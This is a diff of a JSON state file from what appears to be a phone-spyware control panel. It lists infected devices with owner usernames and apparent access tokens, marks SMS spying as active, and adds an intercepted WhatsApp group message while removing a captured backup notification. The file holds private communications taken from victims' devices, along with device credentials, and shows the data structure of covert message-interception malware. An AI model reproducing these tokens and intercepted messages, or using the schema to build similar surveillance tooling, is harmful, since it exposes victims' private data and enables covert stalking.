@@ -5404,7 +5404,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777381645595,
+    "lastSeen": 1777381657983,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -5420,6 +5420,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "jb|| All GAME JAWAA",
+        "content": "~ Raihan Jb: Op?",
+        "time": "28/04 20:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777381647082
+      },
       {
         "appName": "WhatsApp",
         "sender": "jb|| All GAME JAWAA: Membalas Anda",
@@ -9411,14 +9419,6 @@
         "time": "28/04 06:34",
         "pkg": "com.whatsapp",
         "receivedAt": 1777332843989
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Pencadangan sedang berlangsung",
-        "content": "Mengunggah: 12 MB dari 119 MB (10%)",
-        "time": "28/04 06:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777332843278
       }
     ],
     "galleryPhotos": [],
@@ -13486,7 +13486,7 @@
     "deviceName": "HP-SIPAGANESA-9F2F",
     "ownerUsername": "ikiygasima",
     "token": "7f17444d03b5a9a44ba6ab92faf2b179",
-    "lastSeen": 1777381646639,
+    "lastSeen": 1777381658637,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-28T13:01:23.543Z",
